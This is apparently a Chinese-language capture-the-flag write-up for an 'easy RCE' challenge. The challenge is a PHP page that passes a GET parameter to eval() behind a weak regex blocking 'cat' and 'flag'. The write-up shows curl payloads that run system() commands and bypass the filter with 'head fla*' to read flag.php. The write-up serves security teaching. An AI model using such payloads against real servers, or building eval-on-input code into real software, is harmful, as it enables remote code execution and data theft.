---
title: S2-easy_rce2 WriteUp
date: 2022-08-24 16:07:15
tags:
---

## 题目

```php
<?php
//flag in flag.php
highlight_file(__FILE__);
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    if(preg_match('/cat|flag/i', $cmd)){
        die('no no no');
    }else{
        eval($cmd);
    }
}
?> 
```

## 分析代码

```php
<?php
//flag in flag.php
highlight_file(__FILE__);
// 判断GET请求是否有cmd是否存在。
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    // 判断cmd的值是否包含有cat或flag（包含大小写）。
    // 比如：cat Cat CaT flag flAg fLAg 这些都会被正则匹配到。
    if(preg_match('/cat|flag/i', $cmd)){
        die('no no no');
    }else{
        eval($cmd);
    }
}
?> 
```

## 测试

+ 尝试触发正则。

```bash
┌──(kali㉿kali)-[/etc]
└─$ curl "http://你的靶场ID.ctf.nynusec.com/?cmd=system('flag');"    
...
no no no        
```

+ 尝试绕过正则。

```bash
┌──(kali㉿kali)-[/etc]
└─$ curl "http://你的靶场ID.ctf.nynusec.com/?cmd=system('ls');"             
... 
flag.php index.php
```

+ 使用head命令替代cat命令，使用fl*g绕过flag正则。

```bash
# %22 = "
┌──(kali㉿kali)-[/etc]
└─$ curl "http://你的靶场ID.ctf.nynusec.com/?cmd=system(%22head%20fla*%22);"
...
<?php
$flag = 'flag{59274bf7-****-****-****-662b384a96c9}';
?> 
```